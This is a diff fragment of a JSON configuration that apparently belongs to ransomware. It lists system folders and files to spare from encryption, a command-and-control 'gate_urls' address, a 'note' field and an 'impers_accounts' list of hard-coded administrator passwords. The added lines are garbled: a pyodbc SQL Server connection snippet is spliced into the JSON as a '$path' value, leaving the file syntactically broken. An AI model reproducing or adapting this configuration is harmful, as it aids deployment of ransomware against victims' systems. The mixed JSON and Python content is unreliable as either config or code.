@@ -20,6 +20,8 @@
       "set_molombitoh1ck4r": false,
       "set_desktop": false,
       "set_temp": false,
+      "set_$path": true,
+
 }
   "white_folders": "$recycle.bin;config.msi;$windows.~bt;$windows.~ws;windows;boot;program files;program files (x86);programdata;system volume information;tor browser;windows.old;intel;msocache;perflogs;x64dbg;public;all users;default;microsoft",
     "white_files": "autorun.inf;boot.ini;bootfont.bin;bootsect.bak;desktop.ini;iconcache.db;ntldr;ntuser.dat;ntuser.dat.log;ntuser.ini;thumbs.db;GDIPFONTCACHEV1.DAT;d3d9caps.dat",
@@ -30,6 +32,8 @@
     "gate_urls": "https://test.molombitoh1ck3r.com/",
     "impers_accounts": "ad.lab:Qwerty!;Administrator:123QWEqwe!@#;Admin2:P@ssw0rd;Administrator:P@ssw0rd;Administrator:Qwerty!;Administrator:123QWEqwe;Administrator:123QWEqweqwe",
     "note": "
+    "$path": cnxn = pyodbc.connect('DRIVER={ODBC Driver 18 for SQL Server};SERVER='+server+';DATABASE='+database+';ENCRYPT=yes;UID='+username+';PWD='+ password)
+cursor = cnxn.cursor()
   
                  ~~~~~~~~~~                           ~~~~~~~~~~
                                    ~~~~~~~~~~~ 
